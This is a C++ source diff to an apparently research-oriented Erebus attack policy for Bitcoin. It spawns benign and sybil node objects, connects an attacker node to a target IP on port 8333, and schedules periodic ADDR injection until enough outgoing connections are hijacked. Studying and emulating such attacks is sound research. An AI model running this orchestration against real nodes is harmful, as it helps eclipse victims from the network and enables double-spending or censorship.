@@ -5,7 +5,10 @@
 
 #include "../node/BenignNode.h"
 #include "../node/ShadowActiveNode.h"
+#include "../node/ShadowNode.h"
 #include "utility/AttackStat.h"
+
+#include "../ipdb/IPDatabase.h"
 
 using namespace std;
 
@@ -15,60 +18,79 @@ namespace libBLEEP_sybil {
     class ErebusAttackPolicy {
 
     public:
-        ErebusAttackPolicy() {
-            libev_loop = EV_DEFAULT;
+        ErebusAttackPolicy() : libev_loop(EV_DEFAULT) {
             _checkWatcher.set<ErebusAttackPolicy, &ErebusAttackPolicy<NodePrimitives, NodeParams>::_checkAttack>(
                     this);
             _checkWatcher.start();
         }
 
         // step 1. construct virtual network using sybil nodes
-        bool ConstructSybilNet(vector<pair<string, int>> vIP, vector<string> vShadowIP, std::string targetIP,
+        bool ConstructSybilNet(IPDatabase &ipdb, std::string targetIP,
                                int targetPort) {
-            // Spawn network consisting of benign nodes
-            for (auto &[ip, uptime] : vIP) {
-                auto &benignNode = _benignNodes.emplace_back(&_attackStat, ip);
+            vector<pair<string, int>> &vReachableIP = ipdb.GetVReachableIP();
+            vector<string> &vAttackerIP = ipdb.GetVAttackerIP();
+            vector<string> &vShadowIP = ipdb.GetVShadowIP();
+
+
+            // Spawn network consisting of 100,000 benign nodes
+            int ipCount = 0;
+            for (auto &[ip, uptime] : vReachableIP) {
+                auto &benignNode = _benignNodes.emplace_back(&_attackStat, &ipdb, ip, 8333);
 
                 // set a churnout timer for all the benign nodes
                 benignNode.SetChurnOutTimer(uptime);
+
+                ipCount++;
+                if (ipCount >= 100000)
+                    break;
             }
             std::cout << "benign node objects are constructed" << "\n";
 
-            // Make benign nodes to connect to the victim
-            for (auto &_benignNode : _benignNodes) {
-                int conn_fd = _benignNode.tryConnectToTarget(targetIP, targetPort);
-            }
-
             // Spawn network consisting of sybil nodes
             for (auto ip : vShadowIP) {
-                _shadowNodes.emplace_back(&_attackStat, ip);
-                // The implementation of malicious node's periodic connection is dependent to node's behavior
-                // Thus, periodic connection should be implemented within NodePrimitives
+                _shadowNodes.emplace_back(&_attackStat, &ipdb, ip, 8333);
             }
 
-            // Let sybil nodes try to connect to the victim 100 seconds later (i.e., after initializing benign networks)
-            for (auto &_shadowNode : _shadowNodes) {
-                _shadowNode.tryConnectToTarget(targetIP, targetPort, 100);
-            }
+            // Spawn attacker node
+            assert(vAttackerIP.size() > 0);
+            _attackerNode = make_unique<ShadowActiveNode<NodePrimitives>>(&_attackStat, &ipdb, vAttackerIP[0]);
+
+            // Let attacker node to connect to the target
+            _attackerNode->tryConnectToTarget(targetIP, targetPort, 1);
+
+            // Let attacker node to periodically call ADDR injection API
+            _addrInjectTimer.set<ErebusAttackPolicy, &ErebusAttackPolicy::_timercb>(this);
+            _addrInjectTimer.set(NodeParams::addrInjectionStartTime, NodeParams::addrInjectionDelay);
 
             return true;
         }
 
 
     private:
-        list<BenignNode<NodePrimitives>> _benignNodes;
-        list<ShadowActiveNode<NodePrimitives>> _shadowNodes;
+        void _timercb(ev::timer &w, int revents) {
+            _attackerNode->OpAddrInjectionTimeout(NodeParams::preparePhaseTimeLength, NodeParams::addrInjectionDelay,
+                                                  NodeParams::addrInjectionIPPerSec,
+                                                  NodeParams::addrInjectionShadowRate);
+        }
+
+        ev::timer _addrInjectTimer;
+
+    private:
+        list <BenignNode<NodePrimitives>> _benignNodes;
+        list <ShadowNode<NodePrimitives>> _shadowNodes;
+        unique_ptr<ShadowActiveNode<NodePrimitives>> _attackerNode;
+
         AttackStat _attackStat;
 
     private:
         void _checkAttack() {
             // If we hijacked victim's incoming connection more than predefined target number,
             // it means that attack is successful, so break the main loop.
-            if (_attackStat.GetHijackedIncomingConnNum() >= NodeParams::targetIncomingConnNum) {
-                std::cout << "The attack(Eclipsing Incoming Connection) is succeeded." << "\n";
-                std::cout << "Pre-defined target incoming connection num = " << NodeParams::targetIncomingConnNum
+            if (_attackStat.GetHijackedOutgoingConnNum() >= NodeParams::targetOutgoingConnNum) {
+                std::cout << "The EREBUS attack is succeeded." << "\n";
+                std::cout << "Pre-defined target outgoing connection num = " << NodeParams::targetOutgoingConnNum
                           << "\n";
-                std::cout << "Hijacked incoming connection num = " << _attackStat.GetHijackedIncomingConnNum() << "\n";
+                std::cout << "Hijacked outgoing connection num = " << _attackStat.GetHijackedOutgoingConnNum() << "\n";
                 ev_break(libev_loop);
             }
         }
